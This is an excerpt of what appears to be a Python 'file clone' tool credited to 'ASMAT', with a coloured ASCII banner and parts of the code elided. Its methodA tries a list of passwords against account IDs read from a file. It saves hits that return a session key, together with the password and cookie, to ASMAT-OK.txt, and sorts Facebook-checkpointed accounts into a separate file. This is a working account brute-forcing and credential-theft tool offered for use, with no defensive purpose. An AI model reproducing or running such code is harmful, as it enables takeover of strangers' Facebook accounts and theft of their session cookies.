...
88~~~88   `Y8b. 88  88  88 88~~~88    88    
88   88 db   8D 88  88  88 88   88    88    
YP   YP `8888Y' YP  YP  YP YP   YP    YP    
                                         
                                         
\033[1;33mPakistani Server Blocked Use India, Or Bangladesh Location         

{W}{50*'-'}
 {XD} \033[0;32mOWNER     : ASMAT
 {XD} \033[1;33mFEATURE   : ONLY FILE CLONE''
 {XD} GITHUB    : HAVEELI PE AJANA
{W}{50*'-'}''')
...
class FileProcessor:
    ...
    def _fl(self):
        clear()
        print(f" {XD} EXAMPLE : /sdcard/File.txt")
        linex()
    ...
    def methodA(self, ids, names, passlist):
        sys.stdout.write(f'\r\r {XD} {W}[{G}ASMAT>{self.methods[0]}{W}]{O}-{W}[{W}{self.loop}{W}|{G}{len(self.oks)}{W}|{O}{len(self.cps)}{W}]')
        sys.stdout.flush()
        try:
            ...
            for password_template in passlist:
                ...
                try:
                    ...
                    if 'session_key' in response_json:
                        ...
                        print(f'\r\r {XD} [{G}ASMAT>OK{W}] {G}{ids} | {password}{W}')
                        with open('/sdcard/ASMAT-OK.txt', 'a') as file:
                            file.write(f'{ids}|{password}|{cookie}\n')
                        self.oks.append(ids)
                        break
                    elif 'error' in response_json and 'www.facebook.com' in response_json['error']['message']:
                        with open('/sdcard/ASMAT-CP.txt', 'a') as file:
